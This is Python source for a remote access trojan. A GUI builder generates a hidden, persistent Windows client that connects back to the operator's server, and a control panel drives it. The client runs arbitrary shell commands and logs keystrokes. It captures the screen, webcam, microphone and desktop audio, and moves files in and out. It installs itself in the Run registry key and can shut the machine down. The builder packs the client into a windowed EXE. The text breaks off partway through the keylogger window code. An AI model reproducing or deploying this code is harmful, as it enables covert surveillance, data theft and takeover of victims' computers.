import customtkinter as ctk
import socket
import os
import sys
import base64
import io
import time
from threading import Thread, Event
from tkinter import filedialog, messagebox, simpledialog, ttk
from PIL import Image, ImageTk
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import subprocess

##############################################################################
# AES CONFIG (must match client)
##############################################################################
AES_KEY = b"16_BYTE_KEY_1234"
AES_IV  = b"IV_IS_16_BYTE_IV"

def encrypt_data(plaintext: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return cipher.encrypt(pad(plaintext, AES.block_size))

def decrypt_data(ciphertext: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return unpad(cipher.decrypt(ciphertext), AES.block_size)

##############################################################################
# CLIENT TEMPLATE
##############################################################################
client_template = r'''
import socket
import subprocess
import threading
import io
import base64
import sys
import os
import time
import platform
import tkinter
from tkinter import messagebox, scrolledtext
from threading import Thread, Event
import traceback

# -------------------------
# AES config
# -------------------------
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

AES_KEY = b"16_BYTE_KEY_1234"
AES_IV  = b"IV_IS_16_BYTE_IV"

def encrypt_data(b: bytes) -> bytes:
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return c.encrypt(pad(b, AES.block_size))

def decrypt_data(b: bytes) -> bytes:
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return unpad(c.decrypt(b), AES.block_size)

root = tkinter.Tk()
root.withdraw()

chat_window = None
chat_text = None
chat_input_entry = None
chat_active = False

pending_chat_messages = []

keylog_running = False
keylog_buffer = ""

try:
    import keyboard
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False

try:
    import cv2
    OPENCV_AVAILABLE = True
except ImportError:
    OPENCV_AVAILABLE = False

try:
    from PIL import ImageGrab, Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import winreg
    WINREG_AVAILABLE = True
except ImportError:
    WINREG_AVAILABLE = False

try:
    import pyaudio
    PYAUDIO_AVAILABLE = True
except ImportError:
    PYAUDIO_AVAILABLE = False

try:
    import pyttsx3
    TTS_AVAILABLE = True
except ImportError:
    TTS_AVAILABLE = False

# -------------
# PROTOCOL
# -------------
def send_queued_message(sock, msg):
    b = msg.encode("utf-8", errors="replace")
    length_line = str(len(b)) + "\n"
    sock.sendall(length_line.encode("utf-8"))
    sock.sendall(b)

def recv_cmd(sock):
    ln = b""
    while True:
        c = sock.recv(1)
        if not c:
            return ""
        if c == b"\n":
            break
        ln += c
    try:
        sz = int(ln.decode("utf-8", errors="replace"))
    except ValueError:
        return ""
    data = b""
    while len(data) < sz:
        chunk = sock.recv(sz - len(data))
        if not chunk:
            break
        data += chunk
    return data.decode("utf-8", errors="replace")

# -------------
# CHAT
# -------------
def open_chat_window():
    global chat_window, chat_text, chat_input_entry, chat_active
    if chat_window is not None:
        return "[CLIENT] Chat window already open."
    chat_active = True

    chat_window = tkinter.Toplevel(root)
    chat_window.title("Live Chat with Server")
    chat_window.geometry("600x400")

    def do_nothing():
        pass
    chat_window.protocol("WM_DELETE_WINDOW", do_nothing)

    chat_text = scrolledtext.ScrolledText(chat_window, wrap="word")
    chat_text.pack(side="top", fill="both", expand=True)

    bottom_frame = tkinter.Frame(chat_window)
    bottom_frame.pack(side="bottom", fill="x")

    global chat_input_entry
    chat_input_entry = tkinter.Entry(bottom_frame)
    chat_input_entry.pack(side="left", fill="x", expand=True)

    def send_chat():
        msg = chat_input_entry.get().strip()
        if msg:
            pending_chat_messages.append(f"chat_input {msg}")
            chat_input_entry.delete(0, "end")

    send_button = tkinter.Button(bottom_frame, text="Send", command=send_chat)
    send_button.pack(side="left")

    return "[CLIENT] Chat window opened."

def close_chat_window():
    global chat_window, chat_text, chat_input_entry, chat_active
    if chat_window:
        chat_window.destroy()
    chat_window = None
    chat_text = None
    chat_input_entry = None
    chat_active = False
    return "[CLIENT] Chat window closed."

def display_chat_message(sender, text):
    global chat_text
    if chat_text:
        chat_text.insert("end", f"{sender}: {text}\n")
        chat_text.see("end")

# -------------
# SYSTEM INFO
# -------------
def get_detailed_system_info():
    lines = []
    lines.append(f"Python version: {sys.version}")
    lines.append(f"Platform: {sys.platform}")
    uname = platform.uname()
    lines.append(f"System: {uname.system}")
    lines.append(f"Node Name: {uname.node}")
    lines.append(f"Release: {uname.release}")
    lines.append(f"Version: {uname.version}")
    lines.append(f"Machine: {uname.machine}")
    lines.append(f"Processor: {uname.processor}")
    lines.append(f"User: {os.getlogin()}")

    try:
        p = subprocess.run("systeminfo", shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
        lines.append("\n=== SYSTEMINFO ===")
        lines.append(p.stdout or "")
    except:
        pass

    return "\n".join(lines)

# -------------
# SCREENSHOT
# -------------
def screenshot():
    if not PIL_AVAILABLE:
        return "[CLIENT] screenshot not available (PIL missing)."
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        b64 = base64.b64encode(buf.getvalue()).decode("utf-8")
        return "[SCREENSHOT_DATA]" + b64
    except Exception as e:
        return f"[CLIENT] screenshot error: {e}"

# -------------
# SHELL
# -------------
def shell_command(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='replace')
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return f"[CLIENT] Shell command error: {e}"

def dir_b(path_val):
    pth = path_val.strip().rstrip("\\/ ")
    if not pth:
        pth = "C:\\"
    cmd = f'dir /a /b "{pth}"'
    out = shell_command(cmd)
    return out

def mic_record(args):
    if not PYAUDIO_AVAILABLE:
        return "[CLIENT] pyaudio missing."
    import pyaudio
    parts = args.split()
    secs = 5
    if len(parts) > 1:
        try:
            secs = int(parts[1])
        except:
            secs = 5
    chunk = 1024
    fmt = pyaudio.paInt16
    ch = 1
    rate = 44100
    p = pyaudio.PyAudio()
    try:
        stream = p.open(format=fmt, channels=ch, rate=rate, input=True, frames_per_buffer=chunk)
    except Exception as e:
        return f"[CLIENT] mic error: {e}"
    frames = []
    for _ in range(int(rate/chunk*secs)):
        try:
            data = stream.read(chunk)
            frames.append(data)
        except Exception as e:
            return f"[CLIENT] mic error: {e}"
    stream.stop_stream()
    stream.close()
    p.terminate()
    raw = b"".join(frames)
    enc = encrypt_data(raw)
    b64 = base64.b64encode(enc).decode("utf-8")
    return "[MIC_DATA]" + b64

def desktop_audio(args):
    if not PYAUDIO_AVAILABLE:
        return "[CLIENT] pyaudio missing."
    import pyaudio
    parts = args.split()
    secs = 5
    if len(parts) > 1:
        try:
            secs = int(parts[1])
        except:
            secs = 5
    chunk = 1024
    fmt = pyaudio.paInt16
    ch = 1
    rate = 44100
    p = pyaudio.PyAudio()
    try:
        stream = p.open(format=fmt, channels=ch, rate=rate, input=True, frames_per_buffer=chunk)
    except Exception as e:
        return f"[CLIENT] desktop audio error: {e}"
    frames = []
    for _ in range(int(rate/chunk*secs)):
        try:
            data = stream.read(chunk)
            frames.append(data)
        except Exception as e:
            return f"[CLIENT] desktop audio error: {e}"
    stream.stop_stream()
    stream.close()
    p.terminate()
    raw = b"".join(frames)
    enc = encrypt_data(raw)
    b64 = base64.b64encode(enc).decode("utf-8")
    return "[DESKTOP_AUDIO]" + b64

def webcam_photo():
    if not OPENCV_AVAILABLE:
        return "[CLIENT] 'cv2' missing."
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "[CLIENT] Webcam not opened."
        ret, frame = cap.read()
        cap.release()
        if not ret:
            return "[CLIENT] Could not read frame."
        success, encimg = cv2.imencode(".png", frame)
        if not success:
            return "[CLIENT] Could not encode webcam image."
        return "[WEBCAM_DATA]" + base64.b64encode(encimg.tobytes()).decode("utf-8")
    except Exception as e:
        return f"[CLIENT] Webcam error: {e}"

def upload_file(args):
    parts = args.split()
    if len(parts) < 3:
        return "[CLIENT] usage: upload <remotefile> <base64enc>"
    remotefile = parts[1]
    enc_b64 = parts[2]
    try:
        dec = decrypt_data(base64.b64decode(enc_b64))
        with open(remotefile, "wb") as f:
            f.write(dec)
        return f"[CLIENT] Uploaded => {remotefile}"
    except Exception as e:
        return f"[CLIENT] Upload fail: {e}"

def download_file(args):
    parts = args.split()
    if len(parts) < 2:
        return "[CLIENT] usage: download <remotefile>"
    remotefile = parts[1]
    try:
        with open(remotefile, "rb") as f:
            raw = f.read()
        enc = encrypt_data(raw)
        b64 = base64.b64encode(enc).decode("utf-8")
        return "[DOWNLOAD_DATA]" + b64
    except Exception as e:
        return f"[CLIENT] Download fail: {e}"

def add_registry():
    if not WINREG_AVAILABLE:
        return "[CLIENT] 'winreg' missing."
    try:
        import winreg
        path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        exe_path = sys.executable
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS) as k:
            try:
                winreg.DeleteValue(k, "MyRatClient")
            except FileNotFoundError:
                pass
            winreg.SetValueEx(k, "MyRatClient", 0, winreg.REG_SZ, exe_path)
        return "[CLIENT] MyRatClient registry key added."
    except Exception as e:
        return f"[CLIENT] Registry add error: {e}"

def remove_registry():
    if not WINREG_AVAILABLE:
        return "[CLIENT] 'winreg' missing."
    try:
        import winreg
        path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_ALL_ACCESS) as k:
            winreg.DeleteValue(k, "MyRatClient")
        return "[CLIENT] MyRatClient registry key removed."
    except FileNotFoundError:
        return "[CLIENT] Registry key not found."
    except Exception as e:
        return f"[CLIENT] Registry remove error: {e}"

def text_to_speech(args):
    if not TTS_AVAILABLE:
        return "[CLIENT] TTS not available (pyttsx3 missing)."
    parts = args.split(maxsplit=1)
    if len(parts) < 2:
        return "[CLIENT] Usage: tts <message>"
    message = parts[1]
    try:
        import pyttsx3
        engine = pyttsx3.init()
        engine.say(message)
        engine.runAndWait()
        return "[CLIENT] Text-to-speech played."
    except Exception as e:
        return f"[CLIENT] TTS error: {e}"

# -------------
# KEYLOGGER
# -------------
def start_keylogger():
    global keylog_running, keylog_buffer
    if not KEYBOARD_AVAILABLE:
        return "[CLIENT] 'keyboard' missing."
    keylog_running = True
    keylog_buffer = ""
    import keyboard
    def on_key(e):
        global keylog_buffer
        if e.name == "space":
            keylog_buffer += " "
        else:
            keylog_buffer += e.name
    keyboard.on_press(on_key)
    return "[CLIENT] Keylogger started."

def stop_keylogger():
    global keylog_running
    if not KEYBOARD_AVAILABLE:
        return "[CLIENT] 'keyboard' missing."
    keylog_running = False
    import keyboard
    keyboard.unhook_all()
    return "[CLIENT] Keylogger stopped."

def get_keylog():
    global keylog_running, keylog_buffer
    if not KEYBOARD_AVAILABLE:
        return "[CLIENT] 'keyboard' missing."
    if not keylog_running:
        return "[CLIENT] Keylogger not running."
    if not keylog_buffer:
        return "[CLIENT] No keys typed yet."
    return keylog_buffer

# -------------
# LIVE SCREEN
# -------------
def live_screen_jpeg(quality):
    if not PIL_AVAILABLE or not OPENCV_AVAILABLE:
        return "[CLIENT] live_screen_jpeg needs PIL + cv2."
    try:
        from PIL import ImageGrab
        import cv2
        pil_img = ImageGrab.grab()
        cv_img = cv2.cvtColor(
            cv2.numpy.array(pil_img),
            cv2.COLOR_RGB2BGR
        )
        encode_params = [int(cv2.IMWRITE_JPEG_QUALITY), max(10, min(100, quality))]
        success, encimg = cv2.imencode(".jpg", cv_img, encode_params)
        if not success:
            return "[CLIENT] Could not encode live screen."
        b64 = base64.b64encode(encimg.tobytes()).decode("utf-8")
        return "[SCREENSHOT_DATA]" + b64
    except Exception as e:
        return f"[CLIENT] live_screen_jpeg error: {e}"

def dialog_cmd(args):
    parts = args.split(maxsplit=1)
    if len(parts) < 2:
        return "[CLIENT] usage: dialog_cmd <shell>"
    cmd = parts[1]
    return shell_command(cmd)

# -------------
# HANDLE COMMAND
# -------------
def handle_command(line):
    sp = line.strip().split(maxsplit=1)
    base = sp[0].lower()

    if base == "exit":
        return "exit"
    elif base == "chat_on":
        return open_chat_window()
    elif base == "chat_off":
        return close_chat_window()
    elif base == "chat_msg":
        msg = sp[1] if len(sp) > 1 else ""
        display_chat_message("Server", msg)
        return "[CLIENT] Chat message displayed."
    elif base == "chat_input":
        # from client->server typically, so ignore here
        return "[CLIENT] chat_input is for client->server, ignoring."
    elif base == "tts":
        return text_to_speech(line)
    elif base == "screenshot":
        return screenshot()
    elif base == "shell":
        if len(sp) > 1:
            return shell_command(sp[1])
        else:
            return "[CLIENT] usage: shell <cmd>"
    elif base == "dirb":
        if len(sp) > 1:
            return dir_b(sp[1])
        else:
            return dir_b(".")
    elif base == "upload":
        return upload_file(line)
    elif base == "download":
        return download_file(line)
    elif base == "mic_record":
        return mic_record(line)
    elif base == "desktop_audio":
        return desktop_audio(line)
    elif base == "webcam_photo":
        return webcam_photo()
    elif base == "add_startup":
        return add_registry()
    elif base == "remove_startup":
        return remove_registry()
    elif base == "start_keylog":
        return start_keylogger()
    elif base == "stop_keylog":
        return stop_keylogger()
    elif base == "get_keylog":
        return get_keylog()
    elif base == "live_screen_jpeg":
        q = 80
        if len(sp) > 1:
            try:
                q = int(sp[1])
            except:
                q = 80
        return live_screen_jpeg(q)
    elif base == "dialog_cmd":
        return dialog_cmd(line)
    elif base == "system_info":
        return get_detailed_system_info()
    elif base == "send_msg":
        msg = sp[1] if len(sp) > 1 else ""
        try:
            temp = tkinter.Toplevel(root)
            temp.withdraw()
            messagebox.showinfo("Message from Server", msg, parent=temp)
            temp.destroy()
            return "[CLIENT] Message displayed."
        except Exception as e:
            return f"[CLIENT] Message error: {e}"
    elif base == "shutdown":
        try:
            subprocess.run("shutdown /s /t 0", shell=True)
            return "[CLIENT] Shutting down."
        except Exception as e:
            return f"[CLIENT] Shutdown error: {e}"
    elif base == "disconnect":
        sys.exit(0)
    else:
        return shell_command(line)

# -------------
# NETWORK LOOP
# -------------
def rat_networking():
    SERVER_IP = "SERVER_IP_PLACEHOLDER"
    SERVER_PORT = SERVER_PORT_PLACEHOLDER

    print(f"[DEBUG] Attempting to connect to {SERVER_IP}:{SERVER_PORT}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER_IP, SERVER_PORT))
    print("[DEBUG] Connected successfully!")

    while True:
        line = recv_cmd(s)
        if not line:
            break
        if line.lower().strip() == "exit":
            break
        out = handle_command(line)
        if out == "exit":
            send_queued_message(s, "Client exiting.")
            break
        else:
            send_queued_message(s, out)
            if pending_chat_messages:
                for pm in pending_chat_messages:
                    send_queued_message(s, pm)
                pending_chat_messages.clear()
    s.close()

def main():
    t = threading.Thread(target=rat_networking, daemon=True)
    t.start()
    print("[DEBUG] Starting root.mainloop() in main thread.")
    root.mainloop()

if __name__ == "__main__":
    main()
'''

##############################################################################
# CREATE CLIENT FILE
##############################################################################
def create_client_file(ip, port, directory, persistence, reconnect_delay, hidden, client_name):
    """
    Writes out the client code by injecting IP, port, etc. Then runs PyInstaller to produce an EXE.
    """
    import re

    code = client_template

    # If persistence is chosen, replace the single-run rat_networking with a persistent snippet:
    if persistence:
        persistent_snippet = r'''
def rat_networking():
    SERVER_IP = "SERVER_IP_PLACEHOLDER"
    SERVER_PORT = SERVER_PORT_PLACEHOLDER
    while True:
        try:
            print(f"[DEBUG] Attempting to connect to {SERVER_IP}:{SERVER_PORT}")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            print("[DEBUG] Connected successfully!")
            while True:
                line = recv_cmd(s)
                if not line:
                    break
                if line.lower().strip() == "exit":
                    break
                out = handle_command(line)
                if out == "exit":
                    send_queued_message(s, "Client exiting.")
                    break
                else:
                    send_queued_message(s, out)
                    if pending_chat_messages:
                        for pm in pending_chat_messages:
                            send_queued_message(s, pm)
                        pending_chat_messages.clear()
            s.close()
        except Exception as e:
            print("[DEBUG] Connection error:", e)
        time.sleep(RECONNECT_DELAY_PLACEHOLDER)
'''
        code = re.sub(
            r'def rat_networking\(\):.*?def main\(\):',
            persistent_snippet + "\ndef main():",
            code,
            flags=re.DOTALL
        )
        code = code.replace("RECONNECT_DELAY_PLACEHOLDER", str(reconnect_delay))

    # Now do the basic placeholders
    code = code.replace("SERVER_IP_PLACEHOLDER", ip)
    code = code.replace("SERVER_PORT_PLACEHOLDER", str(port))

    ext = ".pyw" if hidden else ".py"
    if not client_name.strip():
        client_name = "client"
    final_name = client_name.strip()
    client_path = os.path.join(directory, final_name + ext)

    with open(client_path, "w", encoding="utf-8") as f:
        f.write(code)

    # Build with PyInstaller
    hidden_flag = "--windowed" if hidden else ""
    hidden_imports = (
        "--hidden-import=cv2 "
        "--hidden-import=keyboard "
        "--hidden-import=PIL.ImageGrab "
        "--hidden-import=Crypto.Cipher "
        "--hidden-import=pyaudio "
        "--hidden-import=pyttsx3 "
        "--hidden-import=pyttsx3.drivers "
        "--hidden-import=pyttsx3.drivers.sapi5 "
        "--hidden-import=comtypes "
        "--hidden-import=pywin32"
    )

    pyinst_cmd = (
        f'pyinstaller --onefile {hidden_flag} --distpath "{directory}" '
        f'{hidden_imports} '
        f'--name {final_name} "{client_path}"'
    )
    print("[DEBUG] PyInstaller command:", pyinst_cmd)
    os.system(pyinst_cmd)
    print(f"Client EXE generated in {directory} as {final_name}.exe")

##############################################################################
# SERVER-SIDE RAT (GUI)
##############################################################################
class RATApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Single-File RAT - Revised for Multi-Port, File Manager, Chat Fixes")
        self.geometry("1000x700")
        ctk.set_appearance_mode("System")

        self.tabview = ctk.CTkTabview(self)
        self.tabview.pack(fill="both", expand=True)

        self.client_gen_tab = self.tabview.add("Client Generator")
        self.server_tab = self.tabview.add("Server")
        self.control_panel_tab = self.tabview.add("Control Panel")

        self.setup_client_gen()
        self.setup_server()
        self.setup_control_panel()

        self.clients = {}
        self.server_sockets = []
        self.server_threads = []
        self.listening = False

        self.chat_windows = {}
        self.screen_view_events = {}
        self.busy_actions = set()

    ##########################################################################
    # CLIENT GENERATOR TAB
    ##########################################################################
    def setup_client_gen(self):
        f = ctk.CTkFrame(self.client_gen_tab)
        f.pack(expand=True, fill="both")

        ctk.CTkLabel(f, text="Generate a Client EXE", font=("Arial", 18)).pack(pady=20)

        ctk.CTkLabel(f, text="Server IP:").pack()
        self.ip_entry = ctk.CTkEntry(f, placeholder_text="127.0.0.1")
        self.ip_entry.pack(pady=5)

        ctk.CTkLabel(f, text="Port:").pack()
        self.port_entry = ctk.CTkEntry(f, placeholder_text="4444")
        self.port_entry.pack(pady=5)

        self.persistence_var = ctk.CTkCheckBox(f, text="Enable Persistence (Auto-Reconnect)")
        self.persistence_var.pack(pady=5)

        ctk.CTkLabel(f, text="Reconnect Delay (sec):").pack()
        self.delay_entry = ctk.CTkEntry(f, placeholder_text="30")
        self.delay_entry.pack(pady=5)

        ctk.CTkLabel(f, text="Client/Exe Name:").pack()
        self.name_entry = ctk.CTkEntry(f, placeholder_text="client")
        self.name_entry.pack(pady=5)

        self.hidden_var = ctk.CTkCheckBox(f, text="Hidden (generate as .pyw)")
        self.hidden_var.pack(pady=5)

        self.directory_path = None
        def browse_dir():
            self.directory_path = filedialog.askdirectory()
            if self.directory_path:
                print("Selected directory:", self.directory_path)
        browse_btn = ctk.CTkButton(f, text="Choose Save Directory", command=browse_dir)
        browse_btn.pack(pady=5)

        gen_btn = ctk.CTkButton(f, text="Generate Client EXE", command=self.gen_client)
        gen_btn.pack(pady=5)

    def gen_client(self):
        ip = self.ip_entry.get().strip()
        port_s = self.port_entry.get().strip()
        if not self.directory_path:
            print("No directory selected.")
            return
        if not ip or not port_s:
            print("Please enter IP and port.")
            return
        try:
            port = int(port_s)
        except ValueError:
            print("Port must be integer.")
            return
        persistence = bool(self.persistence_var.get())
        try:
            delay = int(self.delay_entry.get().strip()) if self.delay_entry.get().strip() else 30
        except ValueError:
            delay = 30
        client_name = self.name_entry.get().strip() or "client"
        hidden = bool(self.hidden_var.get())

        create_client_file(ip, port, self.directory_path, persistence, delay, hidden, client_name)
        print("Client generation complete.")

    ##########################################################################
    # SERVER TAB
    ##########################################################################
    def setup_server(self):
        f = ctk.CTkFrame(self.server_tab)
        f.pack(expand=True, fill="both")

        ctk.CTkLabel(f, text="Server Setup", font=("Arial", 18)).pack(pady=20)

        ctk.CTkLabel(f, text="Listen IP").pack()
        self.server_ip_entry = ctk.CTkEntry(f, placeholder_text="0.0.0.0")
        self.server_ip_entry.pack(pady=5)

        # Updated label to indicate multiple ports can be used
        ctk.CTkLabel(f, text="Listen Port(s) (comma-separated)").pack()
        self.server_port_entry = ctk.CTkEntry(f, placeholder_text="4444 or 4444,5555")
        self.server_port_entry.pack(pady=5)

        self.toggle_server_btn = ctk.CTkButton(f, text="Start Server", command=self.toggle_server)
        self.toggle_server_btn.pack(pady=10)

    def toggle_server(self):
        if not self.listening:
            self.start_server()
            self.toggle_server_btn.configure(text="Stop Server")
        else:
            self.stop_server()
            self.toggle_server_btn.configure(text="Start Server")

    def start_server(self):
        ip = self.server_ip_entry.get().strip() or "0.0.0.0"
        ports_s = self.server_port_entry.get().strip() or "4444"

        # Parse multiple ports
        port_list = []
        for p_str in ports_s.split(","):
            p_str = p_str.strip()
            if not p_str:
                continue
            try:
                p_i = int(p_str)
                port_list.append(p_i)
            except ValueError:
                print(f"Invalid port '{p_str}', skipping.")
        if not port_list:
            port_list = [4444]

        self.listening = True
        self.server_sockets = []
        self.server_threads = []

        # Start a listener thread per port
        for p_i in port_list:
            t = Thread(target=self.listen_on_port, args=(ip, p_i), daemon=True)
            t.start()
            self.server_threads.append(t)

        print(f"Server listening on ports: {port_list}")

    def listen_on_port(self, ip, p_i):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            s.bind((ip, p_i))
            s.listen(5)
            self.server_sockets.append(s)
            print(f"Listening on {ip}:{p_i}")
        except Exception as e:
            print(f"Bind error on port {p_i}:", e)
            return

        while self.listening:
            try:
                s.settimeout(1.0)
                c, addr = s.accept()
                client_ip = f"{addr[0]}:{addr[1]}"
                print("Connection from", client_ip)
                self.clients[client_ip] = c
                self.update_client_list()
            except socket.timeout:
                continue
            except Exception as e:
                print(f"Server error on port {p_i}:", e)
                break
        s.close()

    def stop_server(self):
        self.listening = False
        # Close all sockets
        for s in self.server_sockets:
            try:
                s.close()
            except Exception as e:
                print("Error closing server socket:", e)
        self.server_sockets = []
        print("Server stopped.")

    ##########################################################################
    # CONTROL PANEL TAB
    ##########################################################################
    def setup_control_panel(self):
        f = ctk.CTkFrame(self.control_panel_tab)
        f.pack(expand=True, fill="both")

        f.grid_columnconfigure(0, weight=1)
        f.grid_columnconfigure(1, weight=1)
        f.grid_columnconfigure(2, weight=1)

        ctk.CTkLabel(f, text="Control Panel", font=("Arial", 18)).grid(row=0, column=0, columnspan=3, pady=10)
        ctk.CTkLabel(f, text="Select a Client").grid(row=1, column=0, columnspan=3, pady=5)

        self.client_option = ctk.CTkOptionMenu(f, values=[])
        self.client_option.grid(row=2, column=0, columnspan=3, padx=5, pady=5, sticky="nsew")

        shell_btn = ctk.CTkButton(f, text="Reverse Shell", command=lambda: self.run_command_spam("shell", self.open_shell))
        shell_btn.grid(row=3, column=0, padx=5, pady=5, sticky="ew")

        keylog_btn = ctk.CTkButton(f, text="Keylogger", command=lambda: self.run_command_spam("keylog", self.open_keylogger))
        keylog_btn.grid(row=3, column=1, padx=5, pady=5, sticky="ew")

        # Reminder about screenshot
        sc_btn = ctk.CTkButton(f, text="Screenshot (use RAT command!)",
                               command=lambda: self.run_command_spam("screenshot", self.take_screenshot))
        sc_btn.grid(row=3, column=2, padx=5, pady=5, sticky="ew")

        live_screen_btn = ctk.CTkButton(f, text="Live Screen", command=lambda: self.run_command_spam("live_screen", self.open_live_screen_jpeg_window))
        live_screen_btn.grid(row=4, column=0, padx=5, pady=5, sticky="ew")

        disc_btn = ctk.CTkButton(f, text="Disconnect Client", command=lambda: self.run_command_spam("disconnect", self.disconnect_client))
        disc_btn.grid(row=4, column=1, padx=5, pady=5, sticky="ew")

        sysinfo_btn = ctk.CTkButton(f, text="System Information", command=lambda: self.run_command_spam("system_info", self.show_system_info))
        sysinfo_btn.grid(row=4, column=2, padx=5, pady=5, sticky="ew")

        chat_btn = ctk.CTkButton(f, text="Live Chat", command=lambda: self.run_command_spam("chat", self.open_server_chat_window))
        chat_btn.grid(row=5, column=0, padx=5, pady=5, sticky="ew")

        msg_box_btn = ctk.CTkButton(f, text="Send Message Box", command=lambda: self.run_command_spam("msg_box", self.send_message_box))
        msg_box_btn.grid(row=5, column=1, padx=5, pady=5, sticky="ew")

        shutdown_btn = ctk.CTkButton(f, text="Shutdown Client", command=lambda: self.run_command_spam("shutdown", self.shutdown_client))
        shutdown_btn.grid(row=5, column=2, padx=5, pady=5, sticky="ew")

        add_btn = ctk.CTkButton(f, text="Add to Startup", command=lambda: self.run_command_spam("add_startup", self.add_startup))
        add_btn.grid(row=6, column=0, padx=5, pady=5, sticky="ew")

        rm_btn = ctk.CTkButton(f, text="Remove from Startup", command=lambda: self.run_command_spam("remove_startup", self.remove_startup))
        rm_btn.grid(row=6, column=1, padx=5, pady=5, sticky="ew")

        up_btn = ctk.CTkButton(f, text="Upload File", command=lambda: self.run_command_spam("upload", self.upload_file))
        up_btn.grid(row=6, column=2, padx=5, pady=5, sticky="ew")

        fm_btn = ctk.CTkButton(f, text="File Manager", command=lambda: self.run_command_spam("file_manager", self.file_manager))
        fm_btn.grid(row=7, column=0, padx=5, pady=5, sticky="ew")

        wc_btn = ctk.CTkButton(f, text="Webcam Photo", command=lambda: self.run_command_spam("webcam", self.webcam_photo))
        wc_btn.grid(row=7, column=1, padx=5, pady=5, sticky="ew")

        mic_btn = ctk.CTkButton(f, text="Live Mic", command=lambda: self.run_command_spam("mic", self.live_mic_stream))
        mic_btn.grid(row=7, column=2, padx=5, pady=5, sticky="ew")

        da_btn = ctk.CTkButton(f, text="Live Desktop Audio", command=lambda: self.run_command_spam("desktop_audio", self.live_desktop_stream))
        da_btn.grid(row=8, column=0, padx=5, pady=5, sticky="ew")

    ##########################################################################
    # SPAM-HANDLING
    ##########################################################################
    def run_command_spam(self, action_name, func):
        """Prevents spamming the same action if it's still 'busy'."""
        if action_name in self.busy_actions:
            messagebox.showinfo("Spam Detected", f"Action '{action_name}' is still busy. Please wait.")
            return
        self.busy_actions.add(action_name)
        try:
            func()
        except Exception as e:
            print(f"Error in action '{action_name}':", e)
        def release():
            time.sleep(1)
            self.busy_actions.discard(action_name)
        Thread(target=release, daemon=True).start()

    ##########################################################################
    # UTILS
    ##########################################################################
    def get_sel_client(self):
        s = self.client_option.get()
        if not s or s not in self.clients:
            print("No valid client selected.")
            return None
        return s

    def disconnect_client(self):
        c = self.get_sel_client()
        if not c:
            return
        self.send_cmd(c, "disconnect")
        try:
            self.clients[c].close()
        except:
            pass
        del self.clients[c]
        self.update_client_list()
        print(f"Client {c} disconnected manually.")

    def shutdown_client(self):
        c = self.get_sel_client()
        if not c:
            return
        r = self.send_cmd(c, "shutdown")
        print("Shutdown client response:", r)

    def update_client_list(self):
        arr = list(self.clients.keys())
        self.client_option.configure(values=arr)
        cur = self.client_option.get()
        if arr and cur not in arr:
            self.client_option.set(arr[0])

    ##########################################################################
    # SERVER <-> CLIENT PROTOCOL
    ##########################################################################
    def send_cmd(self, client_key, command):
        if client_key not in self.clients:
            return "No such client."
        sock = self.clients[client_key]
        try:
            data = command.encode("utf-8", errors="replace")
            length_line = str(len(data)) + "\n"
            sock.sendall(length_line.encode("utf-8"))
            sock.sendall(data)
            return self.recv_msg(sock, client_key)
        except (ConnectionResetError, OSError):
            print("Connection lost with", client_key)
            return "Connection lost."

    def recv_msg(self, sock, client_key):
        ln = b""
        while True:
            c = sock.recv(1)
            if not c:
                return ""
            if c == b"\n":
                break
            ln += c
        try:
            sz = int(ln.decode("utf-8", errors="replace"))
        except ValueError:
            return ""
        data = b""
        while len(data) < sz:
            chunk = sock.recv(sz - len(data))
            if not chunk:
                break
            data += chunk
        resp = data.decode("utf-8", errors="replace")

        print(f"[DEBUG] recv_msg from {client_key}: {resp}")
        # If it's "chat_input <msg>", show in server chat
        if resp.startswith("chat_input "):
            msg = resp[len("chat_input "):]
            print(f"[DEBUG] chat_input from client => {msg}")
            if client_key in self.chat_windows:
                w, txt = self.chat_windows[client_key]
                txt.insert("end", f"Client: {msg}\n")
                txt.see("end")
            return "[SERVER] Chat input received."
        else:
            return resp

    ##########################################################################
    # CONTROL ACTIONS
    ##########################################################################
    def open_shell(self):
        c = self.get_sel_client()
        if not c:
            return
        w = ctk.CTkToplevel(self)
        w.title(f"Reverse Shell - {c}")
        w.geometry("600x400")

        txt = ctk.CTkTextbox(w, wrap="word")
        txt.pack(fill="both", expand=True, padx=5, pady=5)

        e = ctk.CTkEntry(w, placeholder_text="shell <cmd>")
        e.pack(pady=5)

        def do_cmd():
            com = e.get().strip()
            if not com:
                return
            r = self.send_cmd(c, com)
            txt.insert("end", f"\n> {com}\n{r}\n")

        b = ctk.CTkButton(w, text="Send", command=do_cmd)
        b.pack(pady=5)

    def open_keylogger(self):
        c = self.get_sel_client()
        if not c:
            return
        start_resp = self.send_cmd(c, "start_keylog")
        print("Keylogger start:", start_resp)

        w = ctk.CTkToplevel(self)
        w.title(f"Keylogger - {c}")
        w.geometry("500x300")

        box = ctk.CTkTextbox(w, wrap="word")
